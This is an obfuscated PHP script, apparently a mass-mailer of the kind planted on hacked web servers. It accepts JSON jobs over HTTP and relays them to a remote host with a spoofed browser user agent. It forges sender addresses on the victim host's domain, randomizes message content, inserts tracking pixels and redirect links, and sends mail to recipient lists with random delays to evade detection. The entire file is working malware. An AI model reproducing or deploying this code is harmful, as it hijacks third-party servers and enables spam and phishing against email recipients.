<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); @error_reporting(0); @ini_set('display_errors', 0); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($sp85be6c) { if ($sp85be6c == 'keys') { return array_keys($this->_keys); } } public function Import($sp85be6c, $sp2bf5c5) { if (is_array($sp2bf5c5)) { $this->values[$sp85be6c] = array(); foreach ($sp2bf5c5 as $sp5edbe5) { if (!empty($sp5edbe5['key'])) { $this->values[$sp85be6c][$sp5edbe5['key']] = $sp5edbe5['value']; } else { $this->values[$sp85be6c][] = $sp5edbe5['value']; } } } else { $this->Assign($sp85be6c, $sp2bf5c5); } } public function Assign($sp85be6c, $sp52b5f1) { $this->values[$sp85be6c] = $sp52b5f1; } public function Parse($sp7ce42b) { $spab28c3 = ''; $sp0974f4 = 0; while (true) { $sp679d85 = strpos($sp7ce42b, '{', $sp0974f4); if ($sp679d85 === false) { $spab28c3 .= substr($sp7ce42b, $sp0974f4); break; } $spab28c3 .= substr($sp7ce42b, $sp0974f4, $sp679d85 - $sp0974f4); $sp0974f4 = $sp679d85 + 1; $sp3ff422 = ''; $sp6db8a5 = '{'; $spb0f3c9 = array(); $sp67db89 = false; $sp1ce8b9 = false; $sp7848bf = 'var'; while ($sp0974f4 < strlen($sp7ce42b)) { $sp876ba0 = substr($sp7ce42b, $sp0974f4, 1); $sp6db8a5 .= $sp876ba0; if ($sp876ba0 == ',' || $sp876ba0 == '>' || $sp876ba0 == '|') { if ($sp7848bf == 'alias') { $sp67db89 = $sp3ff422; } elseif ($sp7848bf == 'mod') { $sp1ce8b9 = $sp3ff422; } else { $spb0f3c9[] = $sp3ff422; } $sp3ff422 = ''; if ($sp876ba0 == '>') { $sp7848bf = 'alias'; } if ($sp876ba0 == '|') { $sp7848bf = 'mod'; } $sp0974f4++; continue; } if ($sp876ba0 == '}') { if ($sp7848bf == 'alias') { $sp67db89 = $sp3ff422; } elseif ($sp7848bf == 'mod') { $sp1ce8b9 = $sp3ff422; } else { $spb0f3c9[] = $sp3ff422; } $sp0974f4++; break; } $sp3ff422 .= $sp876ba0; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $sp876ba0) == 0) { $sp0974f4++; $spb0f3c9 = array(); break; } $sp0974f4++; } if (sizeof($spb0f3c9) == 0) { $spab28c3 .= $sp6db8a5; continue; } $sp00e9fa = false; $sp6c27ae = false; if (preg_match('/^\\^/', $spb0f3c9[0]) > 0) { $spb0f3c9[0] = substr($spb0f3c9[0], 1); $sp00e9fa = true; } if (preg_match('/^\\!/', $spb0f3c9[0]) > 0) { $spb0f3c9[0] = substr($spb0f3c9[0], 1); $sp6c27ae = true; } $sp969125 = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $spb0f3c9[0], $sp2172c4) > 0) { $sp969125 = $sp2172c4[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $spb0f3c9[0], $sp2172c4) > 0) { $sp969125 = explode('-', $sp2172c4[1]); } if ($sp969125 !== false) { $spb0f3c9[0] = substr($spb0f3c9[0], 0, strpos($spb0f3c9[0], '[')); } $this->_keys[$spb0f3c9[0]] = true; if (empty($this->values[$spb0f3c9[0]]) && empty($this->fixed[$spb0f3c9[0]])) { continue; } if ($sp00e9fa) { unset($this->fixed[$spb0f3c9[0]]); } if (isset($this->fixed[$spb0f3c9[0]])) { $spf17294 = $this->fixed[$spb0f3c9[0]]; } else { $spf17294 = ''; $spafc68b = 1; if (sizeof($spb0f3c9) == 2) { $spafc68b = $spb0f3c9[1]; } if (sizeof($spb0f3c9) == 3) { $spafc68b = rand($spb0f3c9[1], $spb0f3c9[2]); } for ($sp91927a = 0; $sp91927a < $spafc68b; $sp91927a++) { if (is_array($this->values[$spb0f3c9[0]])) { if (!is_array($this->used[$spb0f3c9[0]])) { $this->used[$spb0f3c9[0]] = array(); } if (count($this->used[$spb0f3c9[0]]) == count($this->values[$spb0f3c9[0]])) { $this->used[$spb0f3c9[0]] = array(); } if ($sp969125 !== false && is_scalar($sp969125)) { $spf17294 .= $this->values[$spb0f3c9[0]][$sp969125]; $this->used[$sp969125] = true; } else { $sp7ea948 = array(); if (is_array($sp969125)) { $sp277ab8 = $sp969125[0]; $sp612166 = $sp969125[1]; } else { $sp277ab8 = 0; $sp612166 = count($this->values[$spb0f3c9[0]]) - 1; } for ($sp815c6f = $sp277ab8; $sp815c6f <= $sp612166; $sp815c6f++) { if ($sp6c27ae && !empty($this->used[$spb0f3c9[0]][$sp815c6f])) { continue; } $sp7ea948[] = $sp815c6f; } $sp2eb7e2 = $sp7ea948[rand(0, count($sp7ea948) - 1)]; $this->used[$spb0f3c9[0]][$sp2eb7e2] = true; $spf17294 .= $this->values[$spb0f3c9[0]][$sp2eb7e2]; } } else { $spf17294 .= $this->values[$spb0f3c9[0]]; } } } $spf17294 = $this->Parse($spf17294); if ($sp1ce8b9 !== false) { for ($sp042b1f = 0; $sp042b1f < strlen($sp1ce8b9); $sp042b1f++) { switch (substr($sp1ce8b9, $sp042b1f, 1)) { case 'b': $spf17294 = base64_encode($spf17294); break; case 'q': $spf17294 = quoted_printable_encode($spf17294); break; default: break; } } } if ($sp00e9fa) { $this->fixed[$spb0f3c9[0]] = $spf17294; } if ($sp67db89 !== false && $sp67db89 != '') { $this->fixed[$sp67db89] = $spf17294; } $spab28c3 .= $spf17294; } return $spab28c3; } } $spdad9cc = file_get_contents('php://input'); $sp293e81 = json_decode($spdad9cc, true); if (empty($sp293e81['via_proxy'])) { $sp293e81['via_proxy'] = true; $sp122e42 = curl_init($sp293e81['prefix'] . $sp293e81['files']['s']); $spb4e9bf = json_encode($sp293e81); curl_setopt($sp122e42, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($sp122e42, CURLOPT_TIMEOUT, 600); curl_setopt($sp122e42, CURLOPT_RETURNTRANSFER, true); curl_setopt($sp122e42, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($sp122e42, CURLOPT_REFERER, $spc18f49); curl_setopt($sp122e42, CURLOPT_POST, true); curl_setopt($sp122e42, CURLOPT_POSTFIELDS, $spb4e9bf); curl_setopt($sp122e42, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($spb4e9bf))); $spff3dbf = curl_exec($sp122e42); echo $spff3dbf; die; } $sp2226a8 = $_SERVER['SERVER_ADDR']; $sp890eea = $_SERVER['HTTP_HOST']; $sp890eea = preg_replace('/^www\\./', '', $sp890eea); $spe2d69d = new Macros(); $spe2d69d->Assign('server_addr', $sp2226a8); $spe2d69d->Assign('server_host', $sp890eea); foreach ($sp293e81['macros'] as $sp85be6c => $sp2bf5c5) { $spe2d69d->Import($sp85be6c, $sp2bf5c5); } $sp1a3145 = preg_replace('/^www\\./i', '', $sp890eea); $spf75a86 = $spe2d69d->Parse('{from_user}@' . $sp1a3145); $spe2d69d->Assign('from_email', $spf75a86); $spe2d69d->Assign('prefix', $sp293e81['prefix']); $spe2d69d->Assign('html', $sp293e81['letter']['html']); $sp0974f4 = 0; $spac6bf5 = 0; $spf9309c = 0; $sp71b484 = array(); foreach ($sp293e81['rcpt'] as $spbbcaa3) { $spe2d69d->Assign('email', $spbbcaa3['email']); $spe2d69d->Assign('entry', $spbbcaa3); $spe2d69d->Assign('date', date('r')); $spe2d69d->Assign('redirect', $sp293e81['prefix'] . $sp293e81['files']['r']); $spe2d69d->Assign('redirect_with_uri', $sp293e81['prefix'] . $sp293e81['files']['r'] . '?uri='); $spe2d69d->Assign('unsubscribe', $sp293e81['prefix'] . $sp293e81['files']['u'] . '?id=' . $spbbcaa3['id']); $spe2d69d->Assign('delivery', '<img src="' . $sp293e81['prefix'] . $sp293e81['files']['d'] . '?id=' . $spbbcaa3['id'] . '" />'); $sp379ef3 = $spe2d69d->Parse($sp293e81['envelope']['header']); $spcdd4b0 = $spe2d69d->Parse($sp293e81['envelope']['body']); if (!empty($spbbcaa3['name'])) { $sp27955c = $spbbcaa3['name'] . ' <' . $spbbcaa3['email'] . '>'; } else { $sp27955c = $spbbcaa3['email']; } $spc44488 = $spe2d69d->Parse($sp293e81['letter']['subject']); if ($sp0974f4 > 0) { sleep(rand(3, 8)); } $spc3bc10 = mail($sp27955c, $spc44488, $spcdd4b0, $sp379ef3); $sp71b484[$spbbcaa3['id']] = $spc3bc10; if ($spc3bc10) { $spac6bf5++; } else { $spf9309c++; } $sp0974f4++; } echo serialize(array('total' => count($sp293e81['rcpt']), 'sent' => $sp0974f4, 'success' => $spac6bf5, 'error' => $spf9309c, 'rcpt' => $sp71b484));